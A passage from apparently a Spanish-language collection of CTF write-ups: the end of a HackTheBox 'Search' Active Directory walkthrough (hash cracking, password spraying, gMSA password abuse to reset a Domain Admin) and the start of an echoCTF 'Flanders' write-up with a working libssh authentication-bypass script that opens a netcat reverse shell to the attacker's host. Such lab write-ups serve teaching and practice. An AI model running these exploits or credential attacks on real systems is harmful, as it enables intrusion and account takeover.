bd9022de0855052efdb50d7f0fa599e83188c2cd3d2ce452854f9231ecf8f733f79c46ab3196707ae4b792ccd12688866444f26db4554a25ed89d4f69864adb9bcc9ca167d1fabd2da127dd4e09e1928025f0457218097658f61f834cacd6b6b9a9ba8809eafdd1a39860f8926c29b5a3658e88ee55cd2ee915f1128eab3f6d14e58e39eb934759abc0075c331e141dcf36944bae4b823f531ebeefd62d1bc12fa7c79006030efb023a9ed8704833d6eb8223f00d75430309046d2ba7e8d0ebbe5d35661a6e0ad96709d3c0aa0bf1ca85c0ea91c153c70cd83a79302637b02a0e36eebf8b565d5ce1c53546d75ac2471b0d6784e5e59cbbaed80d0441493cd67e8e554259671ef2f3a46b61681eb2c92f7b10846901d6cf7391e92409d3b000eee04ed6d2cbe200f7c2ce0297cd044fbfa60f050d73d4eaa055a740eeb6a109a0e912c0d8f28832ad198200ad195e71a5218a652717ba4a76a06e73037fa60e8a31c11e6a49d931f427
</code></pre>
<p>Una vez obtenido el hash se hizo uso de <code>hashcat</code> para intentar crackear el hash obtenido, obteniendo como resultado la contraseña <code>@3ONEmillionbaby</code>.</p>
<pre><code class="language-powershell">.\hashcat -m 13100 .\hope_sharp.hash .\rockyou.txt
# Data truncada
@3ONEmillionbaby
</code></pre>
<p>Se encontró que las credenciales eran válidas para el servicio <code>smb</code>. Al no tener escritura en ningún directorio, se pudieron identificar otros usuarios existentes dentro del directorio <code>RedirectedFolders$</code>.</p>
<pre><code class="language-bash">└─$ smbclient \\\\10.10.11.129\\RedirectedFolders$ -U 'web_svc'
Password for [WORKGROUP\web_svc]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                  Dc        0  Wed May  3 23:40:56 2023
  ..                                 Dc        0  Wed May  3 23:40:56 2023
  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020
  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020

                3246079 blocks of size 4096. 530782 blocks available
</code></pre>
<h3 id="password-spraying-1"><a class="header" href="#password-spraying-1">Password Spraying</a></h3>
<h4 id="web_svc--edgarjacobs"><a class="header" href="#web_svc--edgarjacobs">web_svc → edgar.jacobs</a></h4>
<p>Posteriormente se hizo uso de <code>crackmapexec</code> para hacer password spraying con las cuentas y contraseñas obtenidas. Identificando la credenciales <code>edgar.jacobs:@3ONEmillionbaby</code> como válidas.</p>
<pre><code class="language-bash">└─$ crackmapexec ldap 10.10.11.129 -u content/valid_users_2.txt -p content/pass.txt --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:IsolationIsKey?
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\edgar.jacobs:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Edith.Walls:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\eve.galvan:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\frederick.cuevas:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\jayla.roberts:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Jordan.Gregory:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\payton.harmon:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Reginald.Morton:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\santino.benjamin:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Savanah.Velazquez:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\trace.ryan:IsolationIsKey?
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby
</code></pre>
<p>Una vez obtenido el acceso se pudo ingresar al folder correspondiente del usuario, encontrando el archivo <code>Phishing_Attempt.xlsx</code> dentro de la carpeta de escritorio.</p>
<pre><code class="language-bash">└─$ smbclient \\\\10.10.11.129\\RedirectedFolders$ -U 'edgar.jacobs'
Password for [WORKGROUP\edgar.jacobs]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; cd edgar.jacobs\
smb: \edgar.jacobs\&gt; dir
  .                                  Dc        0  Thu Apr  9 16:04:11 2020
  ..                                 Dc        0  Thu Apr  9 16:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020
  Documents                         DRc        0  Mon Aug 10 06:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020

                3246079 blocks of size 4096. 525988 blocks available
smb: \edgar.jacobs\&gt; cd desktop
smb: \edgar.jacobs\desktop\&gt; dir
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

                3246079 blocks of size 4096. 525913 blocks available
</code></pre>
<h4 id="edgarjacobs--sierrafrye"><a class="header" href="#edgarjacobs--sierrafrye">edgar.jacobs → sierra.frye</a></h4>
<p>Después de descargar el archivo y descromprimirlo se intentó buscar información relevante dentro de los archivos correspondientes.</p>
<pre><code class="language-bash">└─$ cp Phishing_Attempt.xlsx Phishing_Attempt.zip

└─$ unzip Phishing_Attempt.zip
Archive:  Phishing_Attempt.zip
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/charts/chart1.xml
  inflating: xl/charts/style1.xml
  inflating: xl/charts/colors1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/worksheets/_rels/sheet2.xml.rels
  inflating: xl/drawings/_rels/drawing1.xml.rels
  inflating: xl/charts/_rels/chart1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/printerSettings/printerSettings2.bin
  inflating: xl/calcChain.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
</code></pre>
<p>Encontrando en la ruta <code>xl/worksheets/sheet2.xml</code>, la cual desde la interfaz de usuario se encuentra protegida y no se permite ver la columna <code>C</code> de la segunda página, otros nombres de usuario y contraseñas que se pudieran usar para estos nuevos o los existentes.</p>
<pre><code># Usuarios:

Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Annabelle.Wells
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton

# Contraseñas:

//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
!!05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
==95~pass~QUIET~austria~77==
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
&amp;amp;&amp;amp;75:major:RADIO:state:93&amp;amp;&amp;amp;
**30*venus*BALL*office*42**
;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
**24&amp;amp;moment&amp;amp;BRAZIL&amp;amp;members&amp;amp;66**
$$49=wide=STRAIGHT=jordan=28$$18
</code></pre>
<p>Por lo que nuevamente se realizó un password spraying del compendio de usuarios agregando las nuevas contraseñas identificadas. Encontrando las credenciales <code>sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18</code> como válidas.</p>
<pre><code class="language-bash">└─$ crackmapexec ldap 10.10.11.129 -u valid_users_2.txt -p pass_2.txt --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
# Data truncada
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18
</code></pre>
<p>Dentro de la carpeta del usuario en el servicio de <code>smb</code>, se identificaron los archivos <code>search-RESEARCH-CA.p12</code> y <code>staff.pfx</code>.</p>
<pre><code class="language-bash">└─$ smbclient \\\\10.10.11.129\\RedirectedFolders$ -U 'sierra.frye'
Password for [WORKGROUP\sierra.frye]:
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; cd sierra.frye\
...
smb: \sierra.frye\downloads\backups\&gt; dir
  .                                 DHc        0  Mon Aug 10 16:39:17 2020
  ..                                DHc        0  Mon Aug 10 16:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020

                3246079 blocks of size 4096. 533816 blocks available
</code></pre>
<p>Después de indagar acerca de su uso, se encontró que es posible crackear el <code>.pfx</code> por lo que haciendo uso de <code>pfx2john</code> se extrajo/generó el hash correspondiente para posteriormente hacer uso de <code>john</code> para crackearlo. Encontrando así la passphrase <code>misspissy</code>.</p>
<pre><code class="language-bash">└─$ pfx2john staff.pfx &gt; staff_pfx_hash

└─$ catn staff_pfx_hash
staff.pfx:$pfxng$1$20$2000$20$ab06d852d1875d818341c5737782c7117277265e$308210873082062006092a864886f70d010701a08206110482060d3082060930820605060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e0408cc8cfc26a5...

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt staff_pfx_hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)
1g 0:00:00:44 DONE (2023-05-04 00:33) 0.02269g/s 124478p/s 124478c/s 124478C/s misssnamy..missnono
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
</code></pre>
<p>Al no contar específicamente con un escenario planteado en el uso del <code>.p12</code> como lo es indicado <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/certificate-theft#finding-certificate-files-theft4">aquí</a> se buscó importar el certificado en el navegador para saber si de alguna forma estaba sirviendo como forma de autenticación contra las rutas encontradas a las cuales no se tenía acceso vía web (<code>staff</code> y <code>certsrv</code>). Importando desde opciones de firefox en la sección de &quot;Certificate Manager&quot;, en donde se pedirá la passphrase antes encontrada.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/exploit_1.png" alt="Importación de certificado" /></p>
<p>Posteriormente accediendo desde el subdominio <code>https://research.search.htb/staff/</code> se puede visualizar un login de powershell desde la web, en donde al proveer las credenciales encontradas se obtiene acceso a la máquina.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/exploit_2.png" alt="Acceso a consola web de powershell" /></p>
<h2 id="post-explotación-11"><a class="header" href="#post-explotación-11">Post Explotación</a></h2>
<h3 id="enumeración-22"><a class="header" href="#enumeración-22">Enumeración</a></h3>
<p>Al tratarse de una máquina unida a dominio se recopiló información haciendo uso de <a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> para una vez obtenida, analizarla con <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>. Por lo que se subió el archivo <code>SharpHound.exe</code> y se ejecutó sin parámetros para recopilar el <code>.zip</code> con la información del dominio.</p>
<pre><code class="language-powershell">PS C:\Users\Sierra.Frye\Documents&gt; 

cp \\10.10.16.4\smbFolder\SharpHound.exe .

PS C:\Users\Sierra.Frye\Documents&gt; 

.\SharpHound.exe

2023-05-09T13:45:04.2992791+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-05-09T13:45:04.7524092+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-09T13:45:04.7836667+01:00|INFORMATION|Initializing SharpHound at 13:45 on 09/05/2023
2023-05-09T13:45:17.7604712+01:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-05-09T13:45:17.9323511+01:00|INFORMATION|Beginning LDAP search for search.htb
2023-05-09T13:45:18.0417048+01:00|INFORMATION|Producer has finished, closing LDAP channel
2023-05-09T13:45:18.0573303+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-05-09T13:45:48.3532054+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM
2023-05-09T13:46:13.6037415+01:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-05-09T13:46:13.6193716+01:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-05-09T13:46:13.7131142+01:00|INFORMATION|Status: 345 objects finished (+345 6.272727)/s -- Using 41 MB RAM
2023-05-09T13:46:13.7131142+01:00|INFORMATION|Enumeration finished in 00:00:55.7851484
2023-05-09T13:46:13.8068698+01:00|INFORMATION|Saving cache with stats: 305 ID to type mappings.
 309 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-05-09T13:46:13.8224917+01:00|INFORMATION|SharpHound Enumeration Completed at 13:46 on 09/05/2023! Happy Graphing!

PS C:\Users\Sierra.Frye\Documents&gt; 

ls -force

    Directory: C:\Users\Sierra.Frye\Documents

Mode                LastWriteTime         Length Name

----                -------------         ------ ----                                                                  

d--hsl         4/7/2020  10:07 PM                My Music
d--hsl         4/7/2020  10:07 PM                My Pictures
d--hsl         4/7/2020  10:07 PM                My Videos
d-----        7/31/2020   9:00 AM                WindowsPowerShell
-a----         5/9/2023   1:46 PM          26410 20230509134613_BloodHound.zip
-a----        4/18/2023   3:01 AM        1051648 SharpHound.exe
-a----         5/9/2023   1:46 PM          48450 Y2IwYjcwMmYtN2IwMC00MGNjLWI1MTAtZWYzMDU1ZmVlMjRj.bin

PS C:\Users\Sierra.Frye\Documents&gt; 
</code></pre>
<p>Al descargar y cargar el archivo <code>20230509134613_BloodHound.zip</code> a BloodHound, se buscó identificar las cuentas a las que se contaba con acceso para marcarlas como &quot;Owned&quot;.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/post_1.png" alt="Busqueda y señalado de owned en cuenta" /></p>
<p>Para después dentro de la sección de análisis buscar el camino más rápido de los Principals obtenidos hacia Domain Admin. Encontrando un camino potencial de <code>sierra.frya</code> a <code>tristan.davies</code> por medio del abuso del permiso <code>ReadGMSAPassword</code> que existe en el grupo <code>ITSEC</code> para <code>BIR-ADFS-GMSA$</code> y desde mismo hacia <code>tristan.davies</code> existe un permiso <code>GenericAll</code> disponible para abusar.</p>
<p><img src="htb/boxes/windows/3_dificil/Search/images/post_2.png" alt="Camino más corto a Domain Admin" /></p>
<h3 id="escalación-de-privilegios-10"><a class="header" href="#escalación-de-privilegios-10">Escalación de privilegios</a></h3>
<h4 id="sierrafrya--tristandavies"><a class="header" href="#sierrafrya--tristandavies">sierra.frya → tristan.davies</a></h4>
<p>Inicialmente para abusar del permiso <code>ReadGMSAPassword</code> se encontró el siguiente fragmento de instrucciones en powershell para obtener un NT-Hash e intentar autenticarse con este, sin embargo no se logró de manera satisfactoria.</p>
<pre><code class="language-powershell"># Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
</code></pre>
<p>Por lo que en su lugar, se optó por ejecutar las siguientes instrucciones para concatenar el abuso de <code>ReadGMSAPassword</code> con el <code>GenericAll</code> de <code>BIR-ADFS-GMSA$</code> ya que con la lectura de la contraseña GMSA se puede generar un objeto de tipo credencial y así impersonar al usuario <code>tristan.davies</code> y ejecutar cualquier comando, por ejemplo, un reseteo de contraseña del mismo.</p>
<pre><code class="language-powershell"># Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

$cred = new-object system.management.automation.PSCredential &quot;search.htb\BIR-ADFS-GMSA$&quot;,(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred 
</code></pre>
<p>Y así obtener acceso como Domain Admin en la máquina por medio de <code>impacket-wmiexec</code>. Al momento de realizar la máquina se intentó acceder haciendo uso de <code>impacket-psexec</code> y <code>impacket-smbexec</code> pero no se tuvo éxito.</p>
<pre><code class="language-powershell">└─$ impacket-wmiexec 'search.htb/tristan.davies:Password1234!@10.10.11.129'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
search\tristan.davies

C:\users\administrator\desktop&gt;net user tristan.davies
User name                    Tristan.Davies
Full Name                    Tristan Davies
Comment                      The only Domain Admin allowed, Administrator will soon be disabled
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            08/05/2023 15:43:39
Password expires             Never
Password changeable          09/05/2023 15:43:39
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   08/05/2023 15:35:43

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Admins        *Domain Users
                             *Enterprise Admins    *Group Policy Creator
                             *Schema Admins
The command completed successfully.
</code></pre>
<h2 id="notas-adicionales-4"><a class="header" href="#notas-adicionales-4">Notas adicionales</a></h2>
<p>Al comparar mi resolución me di cuenta que para visualizar la columna protegida del archivo en excel <code>Phishing_Attempt.xlsx</code>, es posible eliminar la protección, borrando la etiqueta <code>&lt;sheetProtection&gt;</code> de <code>xl/worksheets/sheet2.xml</code> y creando de nuevo un zip desde la raíz, de esta manera sería posible visualizar también las columnas directamente en la hoja de cálculo.</p>
<pre><code class="language-bash">└─$ zip phishing.xls -r .
  adding: docProps/ (stored 0%)
  adding: docProps/app.xml (deflated 52%)
  adding: docProps/core.xml (deflated 47%)
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 60%)
  adding: [Content_Types].xml (deflated 79%)
  adding: xl/ (stored 0%)
# Data truncada
</code></pre>
<p><img src="htb/boxes/windows/3_dificil/Search/images/additional_1.png" alt="Columna desprotegida" /></p>
<h2 id="referencias-14"><a class="header" href="#referencias-14">Referencias</a></h2>
<ul>
<li><a href="https://book.hacktricks.xyz/crypto-and-stego/certificates#pfx-p12-pkcs-12-format">Certificados PFX/P12/PKCS#12</a>.</li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/certificate-theft#finding-certificate-files-theft4">Robo de certificados</a>.</li>
<li><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a>.</li>
<li><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>.</li>
<li><a href="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword">Permiso ReadGMSAPassword</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-12"><a class="header" href="#estadísticas-12">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://echoctf.red/target/13">flanders</a></td></tr>
<tr><td>Dificultad</td><td>Beginner</td></tr>
<tr><td>Banderas</td><td>4 (2 system, env, root)</td></tr>
<tr><td>Puntos</td><td>4,800 pts (system/1,000 pts, system/1,300 pts, env/900 pts, root/1,500 pts)</td></tr>
<tr><td>Descripción / Pistas</td><td>Flanders simple and kind, always ready to to give a helping hand. His favorite catch phrase is <code>Okily Dokily</code>. Catch phrase sounds like a pass phrase, only without space</td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-12"><a class="header" href="#reconocimiento-12">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-12"><a class="header" href="#escaneo-de-host-12">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-12"><a class="header" href="#escaneo-completo-de-puertos-12">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">❯ sudo nmap -T5 -open -vvv --min-rate=5000 -p- -n -Pn -oG nmap/all_ports $BOX_TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:35 CDT
Initiating SYN Stealth Scan at 09:35
Scanning 10.0.100.34 [65535 ports]
Discovered open port 6022/tcp on 10.0.100.34
Completed SYN Stealth Scan at 09:35, 14.77s elapsed (65535 total ports)
Nmap scan report for 10.0.100.34
Host is up, received user-set (0.14s latency).
Scanned at 2021-10-27 09:35:04 CDT for 15s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT     STATE SERVICE REASON
6022/tcp open  x11     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.11 seconds
           Raw packets sent: 72729 (3.200MB) | Rcvd: 70809 (2.832MB)
</code></pre>
<h3 id="escaneo-específico-12"><a class="header" href="#escaneo-específico-12">Escaneo específico</a></h3>
<pre><code class="language-bash">❯ nmap -sCV -p 6022 -oN nmap/targeted $BOX_TARGET
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-27 09:48 CDT
Nmap scan report for 10.0.100.34
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
6022/tcp open  ssh     libssh 0.8.1 (protocol 2.0)
| ssh-hostkey:
|_  2048 9c:42:2e:fa:60:30:95:dd:a0:60:80:1f:fd:ae:77:86 (RSA)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds
</code></pre>
<h1 id="enumeración-23"><a class="header" href="#enumeración-23">Enumeración</a></h1>
<h2 id="servicios-nombre---puerto"><a class="header" href="#servicios-nombre---puerto">Servicios (nombre - puerto)</a></h2>
<h3 id="ssh---6022"><a class="header" href="#ssh---6022">ssh - 6022</a></h3>
<h4 id="manual-8"><a class="header" href="#manual-8">Manual</a></h4>
<p>Dado el reconocimiento por medio de <code>nmap</code> se puede identificar que se está corriendo un servidor <code>ssh</code> en un puerto no convencional y se expone la versión <code>libssh 0.8.1</code>, después de una búsqueda se puede identificar que la versión expuesta cuenta con una vulnerabilidad la cuál explota un bypass de autenticación, reportada en el <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-10933">CVE-2018-10933</a>.</p>
<p>Se encontraron diversos scripts en python que abusan de la vulnerabilidad:</p>
<ul>
<li>https://www.exploit-db.com/exploits/45638</li>
<li>https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d</li>
</ul>
<h1 id="explotación-12"><a class="header" href="#explotación-12">Explotación</a></h1>
<h2 id="libssh-authentication-bypass"><a class="header" href="#libssh-authentication-bypass">libSSH Authentication Bypass</a></h2>
<h3 id="pasos-previos--preparación-8"><a class="header" href="#pasos-previos--preparación-8">Pasos previos | Preparación</a></h3>
<p>Como parte de los scripts buscados se encontró el siguiente código en un script que resultó bastante simple de ejecutar, únicamente realizando los cambios pertinentes de ip, puerto y comando (entablando una reverse shell).</p>
<p><strong>Script</strong></p>
<pre><code class="language-python">#!/usr/bin/python3

import sys
import paramiko
import socket

s=socket.socket()
s.connect((&quot;10.0.100.34&quot;,6022))
m=paramiko.message.Message()
t=paramiko.transport.Transport(s)
t.start_client()
m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
t._send_message(m)
c=t.open_session(timeout=5)
c.exec_command(&quot;nc -e /bin/bash 10.10.0.26 1234&quot;)
out=c.makefile(&quot;rb&quot;,2048)
output=out.read()
out.close()
print (output)
</code></pre>
<h3 id="ejecución-19"><a class="header" href="#ejecución-19">Ejecución</a></h3>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/exploit_1.png" alt="exploit_1" /></p>
<ol>
<li>Ejecución de script.</li>
<li>Listener de reverse shell.</li>
</ol>
<h1 id="post-explotación-12"><a class="header" href="#post-explotación-12">Post Explotación</a></h1>
<h2 id="enumeración-24"><a class="header" href="#enumeración-24">Enumeración</a></h2>
<p>Realizando enumeración manual se puede observar que el directorio principal del usuario al que se accede <code>ETSCTF</code> contiene una llave <code>ssh</code> que a primera impresión apuntaría a un método de escalación de privilegios a <code>root</code>.</p>
<p><img src="echoCTF/targets/2_basic/Flanders/./images/post_1.png" alt="post_1" /></p>
<ol>
<li>Directorio.</li>
<li>Llave.</li>
<li>Usuario al que pertenece.</li>
</ol>
